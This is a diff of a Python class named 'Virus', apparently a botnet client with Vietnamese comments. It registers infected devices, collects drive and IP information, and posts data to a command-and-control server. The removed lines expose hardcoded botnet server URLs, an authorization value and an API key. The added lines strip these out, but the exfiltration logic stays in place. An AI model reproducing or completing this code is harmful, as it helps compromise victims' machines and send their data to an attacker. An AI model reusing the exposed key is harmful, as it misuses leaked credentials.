@@ -12,12 +12,12 @@ import socket
 import psutil,shutil
 class Virus:
     def __init__(self,length=20) -> None:
-        self.url_mock = "https://674c570654e1fca9290c42c7.mockapi.io/api_device"  # Thay "1" bằng ID của danh sách cần sửa
+        self.url_mock = ""  # Thay "1" bằng ID của danh sách cần sửa
         self.headers = {
-            "Authorization": "674c570654e1fca9290c42c7",
+            "Authorization": "",
             "Content-Type": "application/json"
         }
-        api_key = "MUM7HUN.5MSQ0RT-VYZMT47-QHSV3JP-45QTXSD"
+        api_key = ""
         self.headers_savekey = {
             'Authorization': f'Bearer {api_key}'
         }
@@ -46,11 +46,11 @@ class Virus:
             print(update_bots.json())
             self.save_drive_info_separately()
             
-        self.url = f'https://botnet-server.vercel.app/api/{self.token}/data'
-        self.url_post = f'https://botnet-server.vercel.app/api/{self.token}'
-        self.upload_url = f"https://botnet-server.vercel.app/api/{self.token}/upload"  # Thay <bot_token> bằng token thật
-        self.file_url = f'https://botnet-server.vercel.app/api/{self.token}/files'
-        self.result = f'https://botnet-server.vercel.app/api/result'
+        self.url = f'/api/{self.token}/data'
+        self.url_post = f'/api/{self.token}'
+        self.upload_url = f"/api/{self.token}/upload"  # Thay <bot_token> bằng token thật
+        self.file_url = f'/api/{self.token}/files'
+        self.result = f'/result'
         
     # # Hàm để lấy tên máy
     def get_public_ip(self):
@@ -161,7 +161,7 @@ class Virus:
         data_newdevice['token'] = self.token
         data_newdevice['token_file'] = data_server
         print(data_newdevice)
-        self.new_deviceurl = f"https://botnet-server.vercel.app/api/newdevice"
+        self.new_deviceurl = f"/api/newdevice"
         response = requests.post(self.new_deviceurl, json=data_newdevice).json()
         print(response)
             # token_bot = response['download_token']
